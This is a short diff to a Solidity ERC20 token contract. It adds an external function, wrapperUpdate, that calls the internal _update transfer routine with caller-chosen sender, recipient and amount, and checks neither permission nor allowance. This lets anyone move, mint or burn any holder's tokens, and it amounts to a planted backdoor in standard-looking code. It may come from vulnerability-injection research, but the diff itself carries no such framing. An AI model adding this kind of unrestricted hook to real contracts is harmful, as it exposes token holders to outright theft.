@@ -369,4 +369,9 @@ abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
             }
         }
     }
+
+
+     function wrapperUpdate(address from, address to, uint256 value) external {
+        _update(from, to, value);
+    }
 }
